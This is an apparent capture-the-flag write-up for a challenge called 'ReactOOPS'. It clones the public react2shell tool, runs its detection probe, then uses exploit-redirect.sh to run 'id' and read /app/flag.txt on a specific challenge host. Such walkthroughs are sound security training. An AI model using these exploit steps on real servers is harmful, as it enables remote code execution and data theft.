# ReactOOPS

---

## [react2shell](https://github.com/freeqaz/react2shell)

```
git clone https://github.com/freeqaz/react2shell.git

-----

chmod +x react2shell/*.sh

-----

cd react2shell

# Run the detection probe
./detect.sh http://<IP>:PORT

```

<img width="1324" height="290" alt="image" src="https://github.com/user-attachments/assets/49ae3a25-e4b3-4c46-add6-8b56930c3999" />

## now exploit

```
./exploit-redirect.sh -q http://<IP>:PORT "id"
```

<img width="1242" height="210" alt="image" src="https://github.com/user-attachments/assets/f30e17e8-e889-4ec0-92a3-d14c02e2feaa" />

## get flag

```
./exploit-redirect.sh http://154.57.164.80:30984/ "cat /app/flag.txt" 
```

<img width="1214" height="224" alt="image" src="https://github.com/user-attachments/assets/86a197f4-4472-4cbb-9112-6ba324a718a2" />

